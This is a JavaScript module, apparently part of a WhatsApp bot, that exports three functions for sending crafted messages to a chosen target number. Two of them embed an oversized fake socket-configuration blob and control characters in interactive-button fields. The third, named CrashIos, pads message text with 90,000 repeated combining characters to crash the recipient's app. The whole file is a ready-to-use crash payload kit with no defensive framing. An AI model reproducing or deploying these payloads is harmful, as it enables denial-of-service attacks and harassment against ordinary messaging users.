async function FChyUi(sock, target) {
  let hyuiForceX = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });
  const contextInfo = {
    mentionedJid: [target],
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  let messagePayload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo,
          body: {
            text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: hyuiForceX + "\u0003",
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    participant: { jid: target },
  });
}

async function ComBoxFC(sock, target) {
  let hyuiForceX2 = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });
  const contextInfo = {
    mentionedJid: [target],
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  let messagePayload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo,
          body: {
            text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: hyuiForceX2 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: hyuiForceX2 + "\u0003",
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    participant: { jid: target },
  });
}

async function CrashIos(sock, target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

module.exports = {
  FChyUi,
  ComBoxFC,
  CrashIos,
};
